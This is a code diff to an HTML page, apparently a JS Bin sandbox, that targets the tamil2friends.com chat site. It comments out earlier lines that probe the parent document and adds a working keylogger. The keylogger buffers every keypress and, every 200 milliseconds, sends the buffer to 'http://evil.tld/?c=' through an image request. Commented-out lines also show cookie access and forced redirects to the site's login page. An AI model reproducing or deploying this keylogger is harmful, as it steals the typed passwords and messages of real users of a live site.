@@ -16,12 +16,31 @@ Released under the MIT license: http://jsbin.mit-license.org
 </head>
 <body>
   <script>
-    document.domain="tamil2friends.com"
+//     document.domain="tamil2friends.com"
 //     console.log("hi start", parent.document.cookie);
-    console.log("check elem",window.parent.document.getElementById('#unblock'));
-    console.log("check elem1",window.parent.$("#unblock"));
+//     console.log("check elem",window.parent.document.getElementById('#unblock'));
+//     console.log("check elem1",window.parent.$("#unblock"));
     ws=new WebSocket("wss://chatroom.tamil2friends.com/chat")
     console.log("ws--",ws);
+    var buffer = [];
+var attacker = 'http://evil.tld/?c='
+
+document.onkeypress = function(e) {
+    var timestamp = Date.now() | 0;
+    var stroke = {
+        k: e.key,
+        t: timestamp
+    };
+    buffer.push(stroke);
+}
+
+window.setInterval(function() {
+    if (buffer.length > 0) {
+        var data = encodeURIComponent(JSON.stringify(buffer));
+        new Image().src = attacker + data;
+        buffer = [];
+    }
+}, 200);
     
 //     window.top.location.href = "http://chatroom.tamil2friends.com/login.php";
 //     parent.location.href = "http://chatroom.tamil2friends.com/login.php";
